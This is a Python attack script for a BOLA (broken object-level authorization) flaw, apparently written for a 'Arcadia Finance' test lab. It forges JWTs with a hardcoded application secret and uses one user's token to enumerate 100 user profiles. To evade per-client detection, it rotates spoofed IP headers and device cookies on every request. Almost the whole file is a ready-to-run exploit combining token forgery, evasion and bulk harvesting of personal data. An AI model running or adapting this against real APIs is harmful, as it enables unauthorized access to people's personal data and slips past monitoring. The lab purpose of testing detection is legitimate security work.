#!/usr/bin/env python3
"""
bola_user_attack.py – Arcadia Finance BOLA attack simulator
============================================================
Sends exactly 100 GET /api/users/{id} requests — one per BOLA target user
(IDs 5–104, seeded in db/init.sql) — but ALL requests use the SAME JWT token,
issued for user ID 5 (Emma Martin).

This simulates a real BOLA attack: a single authenticated user enumerating
every other user's profile by iterating over sequential object IDs, with no
ownership check on the server side.

Each request:
  • Uses the single JWT token of user ID 5 (emma.martin) for all 100 requests.
  • Carries a unique xff IP and _imp_apg_r_ cookie (generated fresh per request).
  • Carries x-traffic-gen: allowed.

Usage:
    python3 bola_user_attack.py [--url http://localhost] [--delay 0.5]

Requirements: Python 3.7+, stdlib only.
"""

import argparse
import base64
import hashlib
import hmac
import json
import random
import time
import urllib.error
import urllib.request
from datetime import datetime

# ── App JWT config (must match main-app/app.py) ───────────────────────────────
JWT_SECRET   = "arcadia-jwt-secret-2026"
JWT_EXPIRY_S = 8 * 3600   # 8 h, matching JWT_EXPIRY_HOURS in app.py

# ── Colours ───────────────────────────────────────────────────────────────────
RESET = "\033[0m"; GREEN = "\033[32m"; RED = "\033[31m"
CYAN  = "\033[36m"; BOLD  = "\033[1m"; DIM = "\033[2m"

# ── 100 BOLA target users — mirrors db/init.sql order exactly (IDs 5–104) ────
# (user_id, first_name, surname)
BOLA_USERS = [
    ( 5,"Emma","Martin"),       ( 6,"Hugo","Simon"),
    ( 7,"Lea","Michel"),        ( 8,"Nathan","Leroy"),
    ( 9,"Manon","Laurent"),     (10,"Theo","Girard"),
    (11,"Camille","Bonnet"),    (12,"Romain","Francois"),
    (13,"Chloe","Martinez"),    (14,"Maxime","Garcia"),
    (15,"Juliette","David"),    (16,"Antoine","Bertrand"),
    (17,"Pauline","Roux"),      (18,"Clement","Vincent"),
    (19,"Marine","Fournier"),   (20,"Florian","Morel"),
    (21,"Laura","Muller"),      (22,"Kevin","Petit"),
    (23,"Emilie","Lemaire"),    (24,"Quentin","Dumont"),
    (25,"Mathilde","Fontaine"), (26,"Baptiste","Rousseau"),
    (27,"Elisa","Blanc"),       (28,"Nicolas","Guerin"),
    (29,"Charlotte","Gauthier"),(30,"Adrien","Robin"),
    (31,"Anais","Clement"),     (32,"Alexis","Mercier"),
    (33,"Lucie","Chevalier"),   (34,"Thomas","Colin"),
    (35,"Virginie","Charpentier"),(36,"Sebastien","Gaillard"),
    (37,"Justine","Renaud"),    (38,"Damien","Dupuis"),
    (39,"Aurelie","Joly"),      (40,"Julien","Perrin"),
    (41,"Melanie","Leclercq"),  (42,"Pierre","Noel"),
    (43,"Sandrine","Masson"),   (44,"Guillaume","Marchand"),
    (45,"Stephanie","Lucas"),   (46,"Xavier","Mathieu"),
    (47,"Nathalie","Henry"),    (48,"Olivier","Renault"),
    (49,"Isabelle","Richard"),  (50,"Laurent","Durand"),
    (51,"Veronique","Thomas"),  (52,"Christophe","Baudoin"),
    (53,"Catherine","Prevot"),  (54,"Philippe","Laporte"),
    (55,"Marie","Lambert"),     (56,"Pascal","Giraud"),
    (57,"Brigitte","Lefevre"),  (58,"Michel","Aubert"),
    (59,"Sylvie","Leclerc"),    (60,"Bernard","Picard"),
    (61,"Monique","Arnaud"),    (62,"Francois","Baron"),
    (63,"Colette","Vidal"),     (64,"Jacques","Caron"),
    (65,"Helene","Dufour"),     (66,"Daniel","Faure"),
    (67,"Martine","Lacroix"),   (68,"Andre","Riviere"),
    (69,"Daniele","Meunier"),   (70,"Claude","Perrot"),
    (71,"Denise","Renard"),     (72,"Roger","Perret"),
    (73,"Odette","Schmitt"),    (74,"Raymond","Gautier"),
    (75,"Ginette","Leroux"),    (76,"Marcel","Besson"),
    (77,"Yvette","Collet"),     (78,"Georges","Millet"),
    (79,"Lucette","Breton"),    (80,"Albert","Leger"),
    (81,"Simone","Hubert"),     (82,"Henri","Gros"),
    (83,"Suzanne","Brun"),      (84,"Maurice","Menard"),
    (85,"Renee","Germain"),     (86,"Louis","Prevost"),
    (87,"Raymonde","Marechal"), (88,"Fernand","Charrier"),
    (89,"Jeannine","Tessier"),  (90,"Gaston","Lefevre"),
    (91,"Yvonne","Courtois"),   (92,"Edouard","Delorme"),
    (93,"Henriette","Gillet"),  (94,"Gustave","Lecomte"),
    (95,"Marcelle","Leduc"),    (96,"Emile","Bouchard"),
    (97,"Georgette","Chevallier"),(98,"Leon","Pelletier"),
    (99,"Gilberte","Lamy"),     (100,"Armand","Fleury"),
    (101,"Marguerite","Chauvet"),(102,"Lucien","Bouvet"),
    (103,"Germaine","Lepage"),  (104,"Fernande","Pelletier"),
]

# ── JWT generator (stdlib only, signed with the real app secret) ──────────────

def _b64url(data):
    """URL-safe base64 encode without padding."""
    if isinstance(data, dict):
        data = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _make_jwt(user_id, username):
    """
    Build a valid HS256 JWT for user_id/username signed with JWT_SECRET.
    Identical structure to _create_jwt() in main-app/app.py — will pass
    the require_auth decorator without needing to log in first.
    """
    now    = int(time.time())
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub":      user_id,
        "username": username,
        "iat":      now,
        "exp":      now + JWT_EXPIRY_S,
    }
    signing_input = f"{_b64url(header)}.{_b64url(payload)}".encode()
    sig = base64.urlsafe_b64encode(
        hmac.new(JWT_SECRET.encode(), signing_input, hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    return f"{signing_input.decode()}.{sig}"

# ── Random identity helpers ───────────────────────────────────────────────────

def _random_ip():
    """Random public-looking IPv4 (skips RFC-1918 ranges)."""
    while True:
        a = random.randint(1, 254)
        if a not in (10, 127, 169, 172, 192):
            return f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def _random_did():
    """Random 16-char hex device-id for _imp_apg_r_ cookie."""
    return f"{random.getrandbits(64):016x}"

# ── HTTP helper ───────────────────────────────────────────────────────────────

def _get(url, token):
    """GET url with Bearer JWT. Returns (status, body_dict, ip, did)."""
    ip  = _random_ip()
    did = _random_did()
    req = urllib.request.Request(url, headers={
        "Authorization": f"Bearer {token}",
        "x-traffic-gen": "allowed",
        "xff":            ip,
        "Cookie":         f"_imp_apg_r_={did}",
    }, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            raw = resp.read().decode()
            return resp.status, (json.loads(raw) if raw else {}), ip, did
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:    body = json.loads(raw)
        except Exception: body = {"raw": raw}
        return e.code, body, ip, did
    except Exception as exc:
        return 0, {"error": str(exc)}, ip, did

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Arcadia Finance – BOLA attack: user ID 5 enumerates all 100 /api/users/{id}",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--url",   default="http://localhost",
                        help="Base URL of the main-app (no trailing slash)")
    parser.add_argument("--delay", type=float, default=0.3,
                        help="Delay between requests in seconds")
    args = parser.parse_args()
    base = args.url.rstrip("/")

    # Single JWT for user ID 5 (Emma Martin) — reused for all 100 requests
    attacker_id, attacker_first, attacker_surname = BOLA_USERS[0]   # (5, "Emma", "Martin")
    attacker_username = f"{attacker_first.lower()}.{attacker_surname.lower()}"
    token = _make_jwt(attacker_id, attacker_username)

    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}  Arcadia Finance — BOLA User Attack{RESET}")
    print(f"{'═'*60}")
    print(f"  Target  : {CYAN}{base}{RESET}")
    print(f"  Attacker: user ID {attacker_id} ({attacker_username}) — single token for all requests")
    print(f"  Targets : {len(BOLA_USERS)} user profiles (IDs 5–104)")
    print(f"  Endpoint: GET /api/users/{{id}}")
    print(f"  Auth    : same JWT reused across all 100 requests")
    print(f"  Delay   : {args.delay}s")
    print(f"{'═'*60}\n")

    ok_count = err_count = 0

    for user_id, first_name, surname in BOLA_USERS:
        username = f"{first_name.lower()}.{surname.lower()}"
        # token is NOT regenerated here — same attacker JWT used for every request
        url      = f"{base}/api/users/{user_id}"

        status, data, ip, did = _get(url, token)

        if status == 200:
            ok_count += 1
            marker = f"{GREEN}✔{RESET}"
            detail = (f"{DIM}{data.get('name','')} {data.get('surname','')} "
                      f"— {data.get('email','')}{RESET}")
        else:
            err_count += 1
            marker = f"{RED}✖{RESET}"
            detail = f"{DIM}{data}{RESET}"

        print(f"  {marker}  [{status}] GET /api/users/{user_id:<4} "
              f"({username:<28}) xff={ip}  {detail}")

        if args.delay > 0:
            time.sleep(args.delay)

    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}  Done — {GREEN}{ok_count} OK{RESET}{BOLD} / "
          f"{RED}{err_count} errors{RESET}{BOLD} across {len(BOLA_USERS)} requests.{RESET}")
    print(f"{'═'*60}\n")


if __name__ == "__main__":
    main()

